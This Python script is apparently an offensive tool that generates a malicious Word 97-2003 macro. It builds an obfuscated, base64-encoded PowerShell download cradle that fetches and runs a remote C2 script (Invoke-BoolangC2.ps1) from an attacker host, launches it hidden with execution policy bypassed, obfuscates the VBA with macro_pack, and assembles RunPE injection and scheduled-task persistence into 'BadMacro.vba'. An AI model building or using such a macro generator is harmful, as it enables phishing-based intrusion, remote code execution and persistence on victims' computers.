#1 BYOI
#2 powershell obfuscation
#3 macro_vba
#4 vba-runPE
#5 OUTPUT to copy paste into word doc. For now, word 97-2003. 

import argparse
import base64
import os
import sys

def powershell_b64_obfuscation(host, port, invoke_boolang, uri=None):
	
	if uri != None:
		if port == 80 or port == None:
			url = f'http://{str(host)}/{str(uri)}/{str(invoke_boolang)}'
		else:
			url = f'http://{str(host)}:{str(port)}/{str(uri)}/{str(invoke_boolang)}'

	else:
		if port == 80 or port == None:
			url = f'http://{str(host)}/{str(invoke_boolang)}'
		else:
			url = f'http://{str(host)}:{str(port)}/{str(invoke_boolang)}'


	ps_payload = f'IEx ((nEW-OBJeCt net.webclient).downloadstring(("{url}")))'

	b64_payload = base64.b64encode(bytes(ps_payload, "UTF-16LE"))

    #this is a test to make sure the base64 is encoded the correct way 
	#print(base64.b64encode(bytes("I`Ex ((nEW`-OBJ`eCt net.webclient).downloadstring(('http://192.'+'16'+'8.1'+'.28/Invo'+'ke-'+'Bool'+'a'+'n'+'g'+'C2.p'+'s1')))", "UTF-16LE")))
	#print("\n")
	#print(base64.b64encode(bytes("IEx ((nEW-OBJeCt net.webclient).downloadstring(('http://192.168.1.28:8080/dir/Invoke-BoolangC2.ps1')))", "UTF-16LE")))
	print(f'[*] Powershell command: {str(ps_payload)} \n')
	print("[*] Powershell downdloader obfuscation: Done\n")
	print(f'[*] Powershell command obfuscated: {str(b64_payload)}\n')

	return b64_payload

#file_arg for now is just the base64 returned from powershell_b64_obfuscation
def vba_obfuscation(office_arch, file, file_arg): 
	
	file_for_macro_pack = open('file_arg.vba', 'w')

	if file == 'ps':
		if str(office_arch) == '32':
			strFile = '\tstrSrcFile = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"\n'
			strArguments = '\tstrSrcArguments  = "-exec Bypass -windowstyle hidden -enc ' + str(file_arg) + '"\n'
			file_for_macro_pack.write(strFile)
			file_for_macro_pack.write(strArguments)
		elif str(office_arch) == '64':
			strFile = '\tstrSrcFile = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"\n'
			strArguments = '\tstrSrcArguments  = "-exec Bypass -windowstyle hidden -enc ' + str(file_arg) + '"\n'
			file_for_macro_pack.write(strFile)
			file_for_macro_pack.write(strArguments)

	if file == 'cmd':
		if str(office_arch) == '32':
			strFile = '\tstrSrcFile = "C:\\Windows\\SysWOW64\\cmd.exe"\n'
			strArguments = '\tstrSrcArguments  = "' + str(file_arg) + '"\n'
			file_for_macro_pack.write(strFile)
			file_for_macro_pack.write(strArguments)
		elif str(office_arch) == '64':
			strFile = '\tstrSrcFile = "C:\\Windows\\System32\\cmd.exe"\n'
			strArguments = '\tstrSrcArguments  = "' + str(file_arg) + '"\n'
			file_for_macro_pack.write(strFile)
			file_for_macro_pack.write(strArguments)

	file_for_macro_pack.close()

	#macro_pack won't run correctly if the output file already exists. so delete if exists
	os.system('del file_arg_obfuscated.vba')

	#once file and arg in file.vba, use macro_pack to obfuscate the code which is below
	#will have to have macro_pack.exe in same directory for now
    #https://github.com/sevagas/macro_pack
	os.system('macro_pack.exe -f file_arg.vba -o -q -G file_arg_obfuscated.vba')

	print("[*] VBA Obfuscation: Done")


#needs RunPE.vba from VBA-RunPE https://github.com/itm4n/VBA-RunPE 
#check onenote for file format. const at top. vba obfuscation at bottom. strSrcFile and strSrcArguments in AutoOpen
def vba_RunPe():
    
    with open('file_arg_obfuscated.vba') as file_arg:
        lines_file_arg = file_arg.readlines()
    
    const_variables = open('const_variables.txt', 'w')
    file_arguments_vba_obfuscated = open('file_arguments_vba_obfuscated.txt', 'w')
    deobfuscate_vba_func = open('deobfuscate_vba_func.txt', 'w')
    
    for x in range(len(lines_file_arg)):
        if x < 3:
            const_variables.write(lines_file_arg[x])
        elif 3 <= x < 5:
            file_arguments_vba_obfuscated.write(lines_file_arg[x])
        else:
            deobfuscate_vba_func.write(lines_file_arg[x])

    const_variables.close()
    file_arguments_vba_obfuscated.close()
    deobfuscate_vba_func.close()
    
    #add all the necessary chunks to create final macro
    with open('windows-api-functions_1.txt') as windows_api_functions:
        windows_api_func = windows_api_functions.read()
    with open('const_variables.txt') as const_variables:
        const = const_variables.read()
    with open('payload_RunPE_3.txt') as payload_RunPE:
        payload_RunPe = payload_RunPE.read()
    with open('file_arguments_vba_obfuscated.txt') as file_arguments_vba_obfuscated:
        file_args = file_arguments_vba_obfuscated.read()
    with open('call_PE_5.txt') as call_PE:
        call_Pe = call_PE.read()
    with open('deobfuscate_vba_func.txt') as deobfuscate_vba_func:
        deobfuscate_vba = deobfuscate_vba_func.read()
    with open('task_schedule_7.txt') as task_schedule:
        task_schdl = task_schedule.read()

    bad_vba = windows_api_func + const + payload_RunPe + file_args + call_Pe + deobfuscate_vba + task_schdl
    with open('BadMacro.vba', 'w') as BadMacro:
        BadMacro.write(bad_vba)
    
    print("\n[*] Creation malicious macro: Done")

        
if __name__=="__main__":

	#my argumment parameters have to be better defined.

	parser = argparse.ArgumentParser()

	parser.add_argument('-H', action='store',
                    dest='host_ip',
                    help='Host IP')
	parser.add_argument('-P', action='store',
                    dest='host_port',
                    help='Host Port -- Default is 80')

	parser.add_argument('-u', action='store',
                    dest='uri',
                    help='Uri -- Default is none')

	parser.add_argument('-f', action='store',
                    dest='file_to_download',
                    help='File to download -- Example: Invoke-BoolangC2.ps1')

	parser.add_argument('-o', action='store',
                    dest='office_arch',
                    help='Office architecture of target -- 32 bit or 64 bit')

	parser.add_argument('-e', action='store',
                    dest='executable',
                    help='execute cmd or ps')

	parser.add_argument('-i', action='store',
                    dest='invoke_boolang',
                    help='If you want to use Invoke_boolangc2.ps1 put -i y')
	

	
	results = parser.parse_args()

	if results.executable != 'cmd' and results.executable != 'ps':
		print("\nYou must specify whether you want to you cmd or powershell!")
		sys.exit()

	if results.office_arch != '32' and results.office_arch != '64':
		print("\nYou must specify the target's office architecture!")
		sys.exit() 


	if results.invoke_boolang == 'y':
		if results.file_to_download == None:
			print("\nYou must specify the filename to download once the macro is enabled!")
			sys.exit()
		if results.host_ip == None:
			print("\nYou must specify your local IP!")
			sys.exit()
		ps1_obfuscation = powershell_b64_obfuscation(results.host_ip, results.host_port, results.file_to_download, results.uri).decode('ascii')
		vba_obfuscation(results.office_arch, results.executable, ps1_obfuscation)
		vba_RunPe()
	
	else:
		vba_obfuscation(results.office_arch, results.executable, )
		vba_RunPe()








	


